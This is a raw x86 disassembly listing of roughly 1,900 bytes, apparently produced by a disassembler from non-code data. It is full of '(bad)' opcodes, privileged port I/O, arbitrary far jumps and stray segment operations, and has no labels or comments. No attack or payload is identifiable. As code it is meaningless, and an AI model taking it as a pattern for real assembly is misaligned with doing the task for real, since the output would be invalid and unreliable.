  418157:	or     eax,0x557424cf
  41815c:	sbb    esp,DWORD PTR [ecx+eiz*4-0x68]
  418160:	dec    eax
  418161:	out    0xff,al
  418163:	(bad)  
  418164:	fidivr WORD PTR [eax+ecx*4+0xd]
  418168:	and    al,0x86
  41816a:	enter  0x95a,0x3e
  41816e:	mov    ebx,ecx
  418170:	pop    es
  418171:	jmp    0x7aca:0x84943449
  418178:	test   edx,ebx
  41817a:	test   BYTE PTR [esp+ecx*8-0xc533d4d],bh
  418181:	xor    eax,0x8c272fe8
  418186:	inc    edx
  418187:	ja     0x418123
  418189:	pop    eax
  41818a:	xor    ebp,DWORD PTR [edx+0x72717611]
  418190:	cmp    BYTE PTR [edx+0x20],0xb1
  418194:	dec    edx
  418195:	mov    ds:0x8aa2b8fa,eax
  41819a:	push   esp
  41819b:	cwde   
  41819c:	(bad)  
  41819d:	adc    eax,0x74260807
  4181a2:	pusha  
  4181a3:	js     0x4181e3
  4181a5:	mov    ecx,0x1021dd08
  4181aa:	add    al,0x12
  4181ac:	mov    ch,0x14
  4181ae:	inc    ebx
  4181af:	rol    DWORD PTR [ebx+0x53],cl
  4181b2:	les    esp,FWORD PTR [esi]
  4181b4:	mov    al,BYTE PTR [edx-0x76e3e7ac]
  4181ba:	stos   DWORD PTR es:[edi],eax
  4181bb:	jmp    0x24b293be
  4181c0:	movd   DWORD PTR [edi],mm1
  4181c3:	mov    ch,0x80
  4181c5:	jnp    0x418200
  4181c7:	push   0xb2f9691f
  4181cc:	in     al,0xe6
  4181ce:	push   esp
  4181cf:	sti    
  4181d0:	not    DWORD PTR [ebx+eiz*4]
  4181d3:	in     eax,0x8a
  4181d5:	mov    edx,0x186dd289
  4181da:	pop    ds
  4181db:	mov    ebx,0x63a4ef86
  4181e0:	std    
  4181e1:	cld    
  4181e2:	jecxz  0x41824c
  4181e4:	pop    ebp
  4181e5:	jmp    0x8c4b431d
  4181ea:	pop    esp
  4181eb:	pop    ebp
  4181ec:	fcom   QWORD PTR [eax]
  4181ee:	icebp  
  4181ef:	nop
  4181f0:	jecxz  0x418267
  4181f2:	sub    edi,ebx
  4181f4:	(bad)  
  4181f5:	adc    DWORD PTR [eax+0x22],eax
  4181f8:	ins    BYTE PTR es:[edi],dx
  4181f9:	lods   eax,DWORD PTR ds:[esi]
  4181fa:	dec    edi
  4181fb:	dec    ecx
  4181fc:	xchg   BYTE PTR [edx-0x67],al
  4181ff:	jmp    0xdba5:0x65d83e6
  418206:	out    0x4f,eax
  418208:	call   0x99de:0x40f3af19
  41820f:	out    0x75,eax
  418211:	and    eax,0x800ee8c5
  418216:	pop    esp
  418217:	mov    bl,0xd
  418219:	inc    ecx
  41821a:	mov    ebx,0x35f6a86d
  41821f:	ror    dl,1
  418221:	push   ecx
  418222:	fisttp DWORD PTR [eax*1+0x2c4e8934]
  418229:	das    
  41822a:	and    ch,BYTE PTR [edi]
  41822c:	es dec ebp
  41822e:	push   ebx
  41822f:	enter  0x6fd1,0x6
  418233:	push   ss
  418234:	in     al,0x9f
  418236:	call   0x44cf5198
  41823b:	(bad)
  41823f:	dec    ecx
  418240:	mov    al,ds:0xdedeb262
  418245:	nop
  418246:	push   cs
  418247:	fldcw  WORD PTR [esi-0x3ed69097]
  41824d:	mov    ebx,0xb4d78753
  418252:	sub    eax,0x84d5ae50
  418257:	add    BYTE PTR [ebp-0x59],dl
  41825a:	pop    ss
  41825b:	xchg   esi,eax
  41825c:	pop    edx
  41825d:	xchg   BYTE PTR [ecx-0x4f],dh
  418260:	push   ebp
  418261:	(bad)  
  418262:	or     bl,BYTE PTR [ebx-0xbea0b1a]
  418268:	xor    eax,edx
  41826a:	lea    esp,[ebx+0x49]
  41826d:	cmc    
  41826e:	pop    esi
  41826f:	shl    ebp,cl
  418271:	pop    edx
  418272:	xchg   esi,eax
  418273:	or     esi,DWORD PTR [ebp-0xa6f2d4f]
  418279:	outs   dx,BYTE PTR ds:[esi]
  41827a:	fmul   QWORD PTR [ebp+0x64]
  41827d:	js     0x418254
  41827f:	mov    ah,0x8a
  418281:	popf   
  418282:	shl    esi,0xe8
  418285:	add    DWORD PTR [edi],0x54d4f6d8
  41828b:	ss mov eax,0xb267b173
  418291:	ss fcmove st,st(2)
  418294:	aas    
  418295:	cmp    DWORD PTR [esi-0x290d5e29],ebp
  41829b:	push   edx
  41829c:	hlt    
  41829d:	or     al,0x6f
  41829f:	mov    esi,0xee229986
  4182a4:	sub    al,0x8f
  4182a6:	aaa    
  4182a7:	adc    al,0x30
  4182a9:	fistp  WORD PTR ds:0xe9dabab8
  4182af:	adc    al,0x1e
  4182b1:	fisttp DWORD PTR [edi]
  4182b3:	neg    BYTE PTR [edi+0x20d3ff80]
  4182b9:	xchg   DWORD PTR [edx-0x4],esi
  4182bc:	ins    DWORD PTR es:[edi],dx
  4182bd:	jle    0x418296
  4182bf:	push   ss
  4182c0:	mov    bl,0x4a
  4182c2:	mov    ebp,0x83157c9
  4182c7:	mov    DWORD PTR [edi+0x69c76bf0],edx
  4182cd:	and    dl,al
  4182cf:	mov    esi,0x3bf446c5
  4182d4:	pop    ds
  4182d5:	sub    ch,BYTE PTR [ebp-0x2736eae9]
  4182db:	ror    DWORD PTR [ecx+0x39],1
  4182de:	addr16 rol bl,0x8a
  4182e2:	in     eax,0x62
  4182e4:	xor    al,BYTE PTR [ebx-0xb]
  4182e7:	xchg   ecx,eax
  4182e8:	xor    eax,0x74bb4616
  4182ed:	(bad)  
  4182ee:	inc    BYTE PTR [edx+ebp*8+0xc]
  4182f2:	hlt    
  4182f3:	lods   al,BYTE PTR ds:[esi]
  4182f4:	xor    al,0x9e
  4182f6:	jo     0x41835a
  4182f8:	test   al,0x60
  4182fa:	nop
  4182fb:	dec    esi
  4182fc:	add    DWORD PTR [ebx+0x2dddd0d9],esi
  418302:	dec    edi
  418303:	mov    eax,DWORD PTR [edx]
  418305:	pusha  
  418306:	pop    esp
  418307:	pop    edx
  418308:	cli    
  418309:	adc    BYTE PTR [esp+ebp*8],bh
  41830c:	dec    ebx
  41830d:	shl    BYTE PTR [eax],1
  41830f:	shl    BYTE PTR [ebx-0x7f],0xf1
  418313:	inc    esp
  418314:	(bad)  
  418315:	iret   
  418316:	out    0xd9,eax
  418318:	jae    0x41829c
  41831a:	mov    edx,0xf82b2c2f
  41831f:	xchg   edi,eax
  418320:	(bad)  
  418321:	enter  0x2e30,0xd4
  418325:	lods   al,BYTE PTR ds:[esi]
  418326:	pop    esp
  418327:	test   al,0xa9
  418329:	or     bh,BYTE PTR [edi]
  41832b:	int3   
  41832c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41832d:	jmp    0x347c:0xd92e1638
  418334:	fstp   st(6)
  418336:	mov    esp,0x6fa1d042
  41833b:	jb     0x4183b0
  41833d:	test   ebx,0x4fa81220
  418343:	aaa    
  418344:	lahf   
  418345:	xor    cl,BYTE PTR [edi+0x1179a9be]
  41834b:	inc    edx
  41834c:	cmp    DWORD PTR [ebx+0x12],esi
  41834f:	push   ecx
  418350:	xchg   esi,eax
  418351:	mov    al,0xa1
  418353:	pusha  
  418354:	jmp    0x198feb9d
  418359:	or     DWORD PTR [ebx+ecx*1+0x5a],esi
  41835d:	cs and al,0x2a
  418360:	pop    ss
  418361:	gs inc dh
  418364:	mov    bh,0x17
  418366:	xchg   DWORD PTR [eax+0x122cdc6a],esp
  41836c:	lock out 0x3c,al
  41836f:	and    bh,BYTE PTR [edi-0x49]
  418372:	mov    bh,0x37
  418374:	push   0xd
  418376:	inc    eax
  418377:	xchg   cl,al
  418379:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41837b:	rol    DWORD PTR [ecx],1
  41837d:	call   0x7acd:0xfd7ae3de
  418384:	adc    DWORD PTR [ecx-0x25f77160],edx
  41838a:	retf   0x91a2
  41838d:	inc    edi
  41838e:	jb     0x4183bf
  418390:	pop    eax
  418391:	mov    al,ds:0xd53a57f4
  418396:	jmp    0x3b244450
  41839b:	xor    DWORD PTR [ecx],ebx
  41839d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41839e:	ret    
  41839f:	push   ss
  4183a0:	pop    ds
  4183a1:	push   cs
  4183a2:	aaa    
  4183a3:	jbe    0x41836c
  4183a5:	ins    DWORD PTR es:[edi],dx
  4183a6:	ds daa 
  4183a8:	call   0xeee82215
  4183ad:	jmp    0x6fd6c89b
  4183b2:	int3   
  4183b3:	test   al,0xaf
  4183b5:	or     esi,DWORD PTR [eax]
  4183b7:	xor    DWORD PTR [edi-0x3c9b3fd2],eax
  4183bd:	sbb    ebp,edx
  4183bf:	std    
  4183c0:	pmullw mm1,QWORD PTR [edx-0x39]
  4183c4:	ds xchg edx,eax
  4183c6:	inc    esi
  4183c7:	sub    eax,DWORD PTR [ecx+0x72]
  4183ca:	add    al,0x33
  4183cc:	outs   dx,BYTE PTR ds:[esi]
  4183cd:	retf   
  4183ce:	call   0x9989:0x91aff676
  4183d5:	cmp    edx,DWORD PTR [ebx-0x62]
  4183d8:	(bad)  
  4183d9:	and    eax,0x5001ecad
  4183de:	popa   
  4183df:	dec    ecx
  4183e0:	xchg   edx,eax
  4183e1:	ret    0x9d70
  4183e4:	or     bl,BYTE PTR [edx-0x15bf6692]
  4183ea:	test   BYTE PTR [eax],ch
  4183ec:	popf   
  4183ed:	cdq    
  4183ee:	call   0xb8f1:0x72772f5f
  4183f5:	je     0x4183d8
  4183f7:	jns    0x41845a
  4183f9:	xor    esp,DWORD PTR [ebx-0x8]
  4183fc:	(bad)  
  4183fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183fe:	hlt    
  4183ff:	mov    al,0x9c
  418401:	add    al,0xb8
  418403:	adc    eax,ebp
  418405:	out    0x1e,eax
  418407:	cdq    
  418408:	leave  
  418409:	shl    al,cl
  41840b:	fild   WORD PTR [eax-0x1af1b8d7]
  418411:	test   BYTE PTR [esi+0x4626371c],0x45
  418418:	and    eax,0x1125ac6b
  41841d:	addr16 mov edx,0xab4cc5b9
  418423:	or     DWORD PTR [edi],ebx
  418425:	sbb    al,BYTE PTR ds:0x15854d4d
  41842b:	cmp    esi,DWORD PTR [ecx-0x641bad90]
  418431:	loope  0x4184ac
  418433:	add    DWORD PTR [esi-0x70348c4b],0xffffff8e
  41843a:	jl     0x41846a
  41843c:	xchg   ebp,eax
  41843d:	rcl    al,1
  41843f:	call   0x5ace3d0e
  418444:	in     eax,0x8c
  418446:	dec    esi
  418447:	mov    ebx,ss
  418449:	add    edx,DWORD PTR [ecx-0x19]
  41844c:	cwde   
  41844d:	scas   eax,DWORD PTR es:[edi]
  41844e:	ds dec ecx
  418450:	outs   dx,BYTE PTR ds:[esi]
  418451:	push   0xd9e91d63
  418456:	outs   dx,DWORD PTR ds:[esi]
  418457:	mov    ch,0x6
  418459:	out    0x29,al
  41845b:	push   0xfffffff7
  41845d:	jb     0x418403
  41845f:	push   eax
  418460:	cli    
  418461:	dec    edx
  418462:	int3   
  418463:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418464:	mov    cl,0xb0
  418466:	adc    al,0x5d
  418468:	xor    bl,BYTE PTR [ebp*8+0x7efe06c9]
  41846f:	fwait
  418470:	and    al,0x5
  418472:	jmp    0xe495a686
  418477:	mov    DWORD PTR [edi-0x69f98586],edx
  41847d:	retf   
  41847e:	mov    ch,0x76
  418480:	adc    DWORD PTR [edi],ebx
  418482:	sbb    DWORD PTR ds:0xd148e360,edx
  418488:	inc    esi
  418489:	enter  0xa4fe,0xdf
  41848d:	adc    DWORD PTR [ebx],esi
  41848f:	jle    0x418429
  418491:	dec    ebx
  418492:	xor    ah,BYTE PTR [ebx-0x67f2b8eb]
  418498:	aaa    
  418499:	add    bh,BYTE PTR [esi]
  41849b:	ss nop
  41849d:	rol    cl,cl
  41849f:	ret    
  4184a0:	arpl   WORD PTR [esi-0x80],cx
  4184a3:	or     BYTE PTR [eax+0x3f52733e],al
  4184a9:	add    al,0x7e
  4184ab:	sub    al,0x52
  4184ad:	fdivr  st(3),st
  4184af:	inc    esp
  4184b0:	xchg   BYTE PTR [ecx-0x2],dh
  4184b3:	aad    0x4e
  4184b5:	sti    
  4184b6:	adc    eax,0x823f9557
  4184bb:	adc    al,0x70
  4184bd:	jbe    0x418522
  4184bf:	call   0x7fe10d8a
  4184c4:	aam    0xa0
  4184c6:	in     al,0x61
  4184c8:	sahf   
  4184c9:	sub    bl,BYTE PTR [edx+0x3deaee30]
  4184cf:	in     al,dx
  4184d0:	lahf   
  4184d1:	je     0x418504
  4184d3:	lods   al,BYTE PTR ds:[esi]
  4184d4:	dec    ebp
  4184d5:	je     0x4184ff
  4184d7:	(bad)  
  4184d8:	enter  0xc8b2,0xcf
  4184dc:	sahf   
  4184dd:	into   
  4184de:	mul    DWORD PTR ds:0xb9ec5903
  4184e4:	cmp    BYTE PTR [eax-0x67],dh
  4184e7:	fs inc esi
  4184e9:	lods   al,BYTE PTR ds:[esi]
  4184ea:	ret    
  4184eb:	or     BYTE PTR [edi-0x7e],ch
  4184ee:	stc    
  4184ef:	ret    0xab6c
  4184f2:	(bad)  
  4184f3:	mov    ds:0xa2fdba64,al
  4184f8:	mov    bl,0xef
  4184fa:	jne    0x418543
  4184fc:	daa    
  4184fd:	loopne 0x41856d
  4184ff:	fs cwde 
  418501:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418502:	pop    ds
  418503:	fs jmp ebp
  418506:	pushf  
  418507:	les    esp,FWORD PTR [edx+0x49]
  41850a:	push   0xffffffed
  41850c:	mov    ch,0x43
  41850e:	sub    BYTE PTR fs:[ecx+ebx*4+0x7ce73db5],cl
  418516:	mov    bl,0x9e
  418518:	sub    cl,cl
  41851a:	inc    eax
  41851b:	and    al,0x94
  41851d:	cmp    al,0x64
  41851f:	or     eax,0xeb284aae
  418524:	fwait
  418525:	mov    ch,0x42
  418527:	dec    esi
  418528:	(bad)  
  418529:	adc    DWORD PTR [edx+0x4b63a83a],esp
  41852f:	lock pop edi
  418531:	add    dh,dl
  418533:	adc    BYTE PTR [esi+0x71],ch
  418536:	jecxz  0x4185b2
  418538:	sti    
  418539:	cmp    edx,DWORD PTR [esi+0x7a]
  41853c:	jp     0x418588
  41853e:	mov    esi,0x47e2ccd7
  418543:	mov    eax,0x1dec55f7
  418548:	or     al,0x29
  41854a:	or     eax,0xd45be296
  41854f:	xchg   ch,dh
  418551:	adc    al,0xf9
  418553:	fwait
  418554:	dec    esi
  418555:	int    0x18
  418557:	into   
  418558:	imul   ebp,DWORD PTR [edx-0xfb8c139],0x2a
  41855f:	mov    ds:0xf40fdcb2,eax
  418564:	ja     0x4185c7
  418566:	retf   0xaed
  418569:	std    
  41856a:	jno    0x418575
  41856c:	lds    eax,FWORD PTR [esi]
  41856e:	fnstsw WORD PTR [edx]
  418570:	pushf  
  418571:	jo     0x418573
  418573:	pop    esp
  418574:	loopne 0x418597
  418576:	aas    
  418577:	fucomp st(6)
  418579:	mov    ecx,ebp
  41857b:	lods   al,BYTE PTR ds:[esi]
  41857c:	jns    0x41856d
  41857e:	fsubrp st(5),st
  418580:	add    DWORD PTR [ebx+0x6a1f28b7],edi
  418586:	push   ds
  418587:	cmp    al,0x98
  418589:	or     ebp,ebx
  41858b:	mov    dl,0x3e
  41858d:	ins    BYTE PTR es:[edi],dx
  41858e:	fadd   DWORD PTR [edi-0x30a37161]
  418594:	int    0x2b
  418596:	mov    cl,0x62
  418598:	retf   0xb4a1
  41859b:	cmp    esi,DWORD PTR [ebp-0x36]
  41859e:	inc    esp
  41859f:	push   edi
  4185a0:	fucom  st(2)
  4185a2:	and    edi,DWORD PTR [esi]
  4185a4:	mov    bl,0x71
  4185a6:	mov    esp,0x47491eb9
  4185ab:	mov    edx,0xd0d31570
  4185b0:	xchg   ecx,eax
  4185b1:	pop    esi
  4185b2:	popa   
  4185b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185b4:	pusha  
  4185b5:	mov    al,ds:0x8ae522f5
  4185ba:	fdivr  DWORD PTR [edx+eiz*1+0x39]
  4185be:	iret   
  4185bf:	ins    WORD PTR es:[edi],dx
  4185c1:	jmp    0xc063:0x54223a0f
  4185c8:	rcl    DWORD PTR [esi+0x10763e1a],0x27
  4185cf:	jg     0x4185cf
  4185d1:	gs adc ebx,ebx
  4185d4:	sahf   
  4185d5:	mov    eax,ds:0xa328dec0
  4185da:	jae    0x4185bf
  4185dc:	mov    ds:0x8cc68f57,eax
  4185e1:	dec    ebp
  4185e2:	mov    edx,0x79471e21
  4185e7:	dec    ecx
  4185e8:	or     eax,0xca7acea3
  4185ed:	test   dh,bl
  4185ef:	sbb    al,0xd
  4185f1:	jo     0x418658
  4185f3:	loop   0x418639
  4185f5:	xor    al,0xca
  4185f7:	push   esi
  4185f8:	rol    ch,cl
  4185fa:	pop    eax
  4185fb:	or     al,0x94
  4185fd:	push   eax
  4185fe:	add    al,0xbd
  418600:	jl     0x418642
  418602:	add    bl,BYTE PTR [edi]
  418604:	mov    fs,WORD PTR [eax]
  418606:	call   0xcc55:0x9719ac5b
  41860d:	(bad)  
  41860e:	shl    BYTE PTR [edi],1
  418610:	(bad)  
  418611:	in     eax,0xfb
  418613:	adc    DWORD PTR [eax-0xa],eax
  418616:	bound  ebx,QWORD PTR [ebp-0x3cc57ff1]
  41861c:	aas    
  41861d:	mov    ds:0xdf82ab18,al
  418622:	dec    edx
  418623:	push   ebx
  418624:	mov    cl,0x33
  418626:	mov    bl,0x8d
  418628:	or     al,0x27
  41862a:	test   eax,0x9f20646f
  41862f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418630:	pop    edx
  418631:	or     eax,0xaefdd936
  418636:	test   al,0x59
  418638:	cmp    eax,0xb5543636
  41863d:	mov    ebx,0x2a3b243d
  418642:	js     0x41865f
  418644:	cwde   
  418645:	das    
  418646:	int    0xa3
  418648:	mov    edi,0x106c15ea
  41864d:	cmp    cl,BYTE PTR [edi-0x78]
  418650:	sub    esp,DWORD PTR [edi-0x4c]
  418653:	clc    
  418654:	add    BYTE PTR [esi-0x7f],ah
  418657:	das    
  418658:	fisttp QWORD PTR [eax+0x51a2a2d6]
  41865e:	stos   BYTE PTR es:[edi],al
  41865f:	cmp    ebx,ebx
  418661:	dec    ebp
  418662:	pop    edi
  418663:	retf   0xc6e5
  418666:	jp     0x4186b5
  418668:	jge    0x418685
  41866a:	cld    
  41866b:	ins    DWORD PTR es:[edi],dx
  41866c:	(bad)  
  41866d:	scas   al,BYTE PTR es:[edi]
  41866e:	pop    eax
  41866f:	jle    0x4185fe
  418671:	retf   
  418672:	pushf  
  418673:	mov    DWORD PTR [edx],eax
  418675:	imul   edx,DWORD PTR [edx],0xffffffff
  418678:	inc    ebp
  418679:	int    0x0
  41867b:	mov    ecx,0x334062c8
  418680:	xor    esp,edi
  418682:	popa   
  418683:	lea    ebx,[ecx]
  418685:	xor    eax,0xe0456cbc
  41868a:	or     al,0x99
  41868c:	adc    ch,ch
  41868e:	pop    es
  41868f:	cmp    DWORD PTR [edi],esi
  418691:	dec    edi
  418692:	jecxz  0x418617
  418694:	stos   DWORD PTR es:[edi],eax
  418695:	cmp    ch,ah
  418697:	adc    bl,BYTE PTR [eax+0x6d83349]
  41869d:	pop    esi
  41869e:	iret   
  41869f:	ins    BYTE PTR es:[edi],dx
  4186a0:	shl    BYTE PTR [edx+0x72],1
  4186a3:	xchg   ebp,eax
  4186a4:	dec    ecx
  4186a5:	mov    cl,0x83
  4186a7:	xchg   DWORD PTR [esp+eiz*8],edx
  4186aa:	ret    0x7d33
  4186ad:	jmp    0x418646
  4186af:	pop    ebx
  4186b0:	leave  
  4186b1:	shr    DWORD PTR [edi+eax*8+0x687afa2c],1
  4186b8:	mov    esp,0x530754e3
  4186bd:	bound  eax,QWORD PTR [ecx+0x34c57b65]
  4186c3:	mov    ch,0x79
  4186c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186c6:	mov    ecx,es
  4186c8:	scas   al,BYTE PTR es:[edi]
  4186c9:	jbe    0x4186ca
  4186cb:	aas    
  4186cc:	push   0xb38a93d6
  4186d1:	or     dh,BYTE PTR [edx+edx*1]
  4186d4:	into   
  4186d5:	inc    esi
  4186d6:	push   esp
  4186d7:	into   
  4186d8:	test   al,0xfa
  4186da:	hlt    
  4186db:	inc    edi
  4186dc:	rol    ebx,0xff
  4186df:	jp     0x41873a
  4186e1:	loope  0x418685
  4186e3:	pop    es
  4186e4:	sahf   
  4186e5:	loop   0x4186ce
  4186e7:	cmc    
  4186e8:	sbb    BYTE PTR [edx-0x7],ch
  4186eb:	jno    0x4186f7
  4186ed:	lds    ebp,FWORD PTR [edi-0x1c]
  4186f0:	xor    edx,DWORD PTR [edx+edx*4]
  4186f3:	ja     0x418727
  4186f5:	movlps xmm1,QWORD PTR [edi+0x6f]
  4186f9:	std    
  4186fa:	inc    edx
  4186fb:	repnz loop 0x4186ea
  4186fe:	popa   
  4186ff:	mov    edi,0xeea631c6
  418704:	sub    ecx,0x6e38f9fb
  41870a:	or     eax,0xbc8a2612
  41870f:	test   eax,0x7c7e385a
  418714:	shr    BYTE PTR [esi],0xee
  418717:	repnz push esi
  418719:	adc    al,0x36
  41871b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41871c:	or     ebx,ecx
  41871e:	jno    0x4186bc
  418720:	retf   0x76d3
  418723:	or     DWORD PTR [ebx-0x2cdf4176],ebp
  418729:	jmp    0x41875a
  41872b:	inc    edi
  41872c:	rcr    DWORD PTR [esi],1
  41872e:	adc    DWORD PTR [ebx-0x56a1fcd4],esi
  418734:	ss mov bh,0xba
  418737:	mov    eax,0xa61c56e7
  41873c:	lahf   
  41873d:	add    DWORD PTR [eax],ebp
  41873f:	xchg   ebp,eax
  418740:	aad    0xdf
  418742:	mov    bl,0x94
  418744:	cdq    
  418745:	fidiv  DWORD PTR [ecx+0x51ec5134]
  41874b:	inc    eax
  41874c:	popa   
  41874d:	mov    al,ds:0x611d3389
  418752:	push   eax
  418753:	fwait
  418754:	enter  0xdd6d,0x27
  418758:	sti    
  418759:	call   0x9c6b:0x80065f9d
  418760:	aad    0x81
  418762:	outs   dx,BYTE PTR ds:[esi]
  418763:	pop    ecx
  418764:	push   esp
  418765:	dec    BYTE PTR [edi+0x1]
  418768:	into   
  418769:	faddp  st(0),st
  41876b:	adc    dl,BYTE PTR [ecx-0xa]
  41876e:	dec    ebx
  41876f:	adc    bl,BYTE PTR [ecx+0x5f]
  418772:	out    dx,al
  418773:	xor    ecx,ecx
  418775:	push   ds
  418776:	add    ah,al
  418778:	fisttp QWORD PTR [eax+0x59f7f5e7]
  41877e:	jne    0x4187ee
  418780:	and    DWORD PTR [ecx],esi
  418782:	stc    
  418783:	pop    edx
  418784:	pop    eax
  418785:	sub    cl,0xdd
  418788:	inc    edi
  418789:	pop    bx
  41878b:	imul   edx,DWORD PTR [esi-0x25881d4e],0xffffff94
  418792:	lock shl esp,0x7a
  418796:	jbe    0x418771
  418798:	cmp    DWORD PTR [eax+0x1ff35310],ebx
  41879e:	cmp    eax,0xd153e2c0
  4187a3:	xor    eax,0xa8191c5a
  4187a8:	shl    DWORD PTR [esi-0x3020cfb9],0x44
  4187af:	adc    eax,DWORD PTR [ebx+esi*8-0x46bf7664]
  4187b6:	add    al,dl
  4187b8:	inc    edi
  4187b9:	jp     0x4187e1
  4187bb:	push   edi
  4187bc:	and    al,0xbe
  4187be:	jb     0x418825
  4187c0:	retf   0xe2b
  4187c3:	repz addr16 sbb ch,dl
  4187c7:	mov    esp,0x14777eb1
  4187cc:	xchg   edx,eax
  4187cd:	sub    al,0x88
  4187cf:	push   ebp
  4187d0:	push   0x989642d6
  4187d5:	add    eax,0x7704d59f
  4187da:	popf   
  4187db:	enter  0xe861,0x5f
  4187df:	pop    ecx
  4187e0:	(bad)  [ecx-0x59ab95cc]
  4187e6:	call   0x8652:0xb11c8fe
  4187ed:	jbe    0x4187ee
  4187ef:	xor    esp,DWORD PTR ds:[ebp+0x60]
  4187f3:	pop    edi
  4187f4:	dec    ebp
  4187f5:	cmp    eax,0x66b4260
  4187fa:	in     al,0xbc
  4187fc:	xchg   esi,eax
  4187fd:	xlat   BYTE PTR ds:[ebx]
  4187fe:	and    al,bh
  418800:	sub    dl,BYTE PTR [edx+0x3]
  418803:	sbb    bh,dh
  418805:	sub    DWORD PTR [edx],esp
  418807:	dec    esi
  418808:	cwde   
  418809:	shr    BYTE PTR [eax+0x6f],0x40
  41880d:	pop    ebp
  41880e:	jne    0x418813
  418810:	test   ah,ah
  418812:	lods   eax,DWORD PTR ds:[esi]
  418813:	inc    edi
  418814:	jmp    0x5bcd:0x3a67e575
  41881b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41881c:	ss bnd jae 0x4187b2
  418820:	fsubr  QWORD PTR [eax+0x28]
  418823:	jmp    DWORD PTR ds:0xc413479d
  418829:	in     al,dx
  41882a:	shl    DWORD PTR [eax-0x5],cl
  41882d:	loop   0x4187cb
  41882f:	add    DWORD PTR [eax+0x72b300f3],0xe12c552b
  418839:	push   ss
  41883a:	sti    
  41883b:	mov    eax,ds:0x42cf1846
  418840:	fisttp QWORD PTR [edi+eiz*4]
  418843:	aas    
  418844:	iret   
  418845:	and    eax,edi
  418847:	cmp    ecx,DWORD PTR [eax]
  418849:	retf   
  41884a:	jnp    0x41883b
  41884c:	(bad)  
  41884d:	inc    esp
  41884e:	xchg   esp,eax
  41884f:	pop    es
  418850:	jge    0x418849
  418852:	je     0x418850
  418854:	add    eax,0xdba460d9
  418859:	mov    cl,0x23
  41885b:	xchg   ebp,eax
  41885c:	bound  edi,QWORD PTR [ebx+0x77]
  41885f:	and    DWORD PTR [eax-0x2c],ebx
  418862:	in     eax,0x1f
  418864:	into   
  418865:	test   eax,0xc67b7788
  41886a:	scas   al,BYTE PTR es:[edi]
  41886b:	es pusha 
  41886d:	jp     0x418809
  41886f:	xor    cl,BYTE PTR [ecx+0x3d]
  418872:	mov    al,0x14
  418874:	and    eax,DWORD PTR [esi+0x1c]
  418877:	out    dx,eax
  418878:	aad    0xb2
  41887a:	repz push ecx
  41887c:	jl     0x418807
  41887e:	jle    0x41888d
  418880:	or     al,dl
  418882:	lock inc ecx
  418884:	enter  0xdbcd,0xcc
  418888:	xor    DWORD PTR [ebp-0x60],ebp
  41888b:	add    ebx,DWORD PTR [ecx]
  41888d:	jo     0x4188e3
  41888f:	(bad)  
  418890:	jns    0x41886b
  418892:	xchg   BYTE PTR [esi+ebx*4],dh
  418895:	push   edi
  418896:	xchg   edx,eax
  418897:	push   ebx
  418898:	std    
  418899:	ror    bh,cl
  41889b:	or     ch,dh
  41889d:	daa    
  41889e:	jmp    0xf57c:0xd042538c
  4188a5:	push   ebp
  4188a6:	dec    ebx
  4188a7:	sbb    ebp,edx
  4188a9:	inc    esp
  4188aa:	(bad)  
  4188ab:	push   es
  4188ac:	cmp    edi,esi
  4188ae:	push   ss
  4188af:	gs aam 0xb6
  4188b2:	pop    ds
  4188b3:	out    0x1f,al
  4188b5:	xchg   esi,eax
  4188b6:	std    
  4188b7:	cmp    al,BYTE PTR [edi+0x2f1c2e15]
  4188bd:	in     al,dx
  4188be:	stc    
  4188bf:	hlt    
  4188c0:	(bad)  
  4188c2:	xchg   ecx,eax
  4188c3:	ss jbe 0x4188eb
  4188c6:	sti    
  4188c7:	lds    edx,FWORD PTR [edx]
  4188c9:	in     al,dx
  4188ca:	or     al,0x58
  4188cc:	push   es
  4188cd:	shl    BYTE PTR [edx+ebp*8+0x0],1
  4188d1:	adc    ebx,ecx
  4188d3:	aaa    
  4188d4:	jge    0x418908
  4188d6:	into   
  4188d7:	jle    0x41889d
  4188d9:	jne    0x41894a
  4188db:	xchg   ebp,eax
  4188dc:	arpl   WORD PTR [esi-0x11de13d7],ax
  4188e2:	xlat   BYTE PTR ds:[ebx]
  4188e3:	mov    edi,0xab15434a
  4188e8:	test   eax,0xa9832285
  4188ed:	das    
  4188ee:	or     dh,bh
  4188f0:	lsl    esp,cx
  4188f3:	out    dx,al
  4188f4:	pop    edx
  4188f5:	inc    edx
  4188f6:	mov    eax,ds:0x8fa063ee
  4188fb:	callw  0xe6f
  4188ff:	and    DWORD PTR [edx+0x7],esi
  418902:	pop    ebx
  418903:	stos   BYTE PTR es:[edi],al
  418904:	das    
  418905:	xchg   ecx,eax
  418906:	pop    edx
  418907:	mov    DWORD PTR ss:[esi+0x2],eax
  41890b:	mov    DWORD PTR ds:0xc03dbd50,esi
  418911:	and    al,0x82
  418913:	adc    eax,0x7e7e6d41
  418918:	add    edx,ebx
  41891a:	test   eax,0x1d751c29
  41891f:	jmp    0x41891b
  418921:	pop    ss
  418922:	add    DWORD PTR [ebx+edx*8+0x20b51641],esp
  418929:	sbb    al,0x70
  41892b:	or     al,BYTE PTR [edx+0x20]
  41892e:	cld    
  41892f:	popa   
  418930:	xchg   ecx,eax
  418931:	mov    esp,0x25019576
  418936:	dec    edx
  418937:	dec    esp
  418938:	sub    eax,ebp
  41893a:	add    edx,0x99a41bc0
  418940:	add    BYTE PTR [ebp-0x6788ec91],0x63
  418947:	aam    0xc0
  418949:	sub    bl,BYTE PTR [edx-0x58ea0b24]
  41894f:	mov    bl,0xe4
  418951:	xlat   BYTE PTR ds:[ebx]
  418952:	mov    BYTE PTR [ebx-0x5f],ch
  418955:	mov    ds:0x3fde464e,al
  41895a:	sbb    BYTE PTR [ebp+0x7b4aa998],0xfd
  418961:	leave  
  418962:	jb     0x4188f1
  418964:	adc    dl,BYTE PTR [ecx-0x750ff5dd]
  41896a:	popa   
  41896b:	jb     0x418942
  41896d:	icebp  
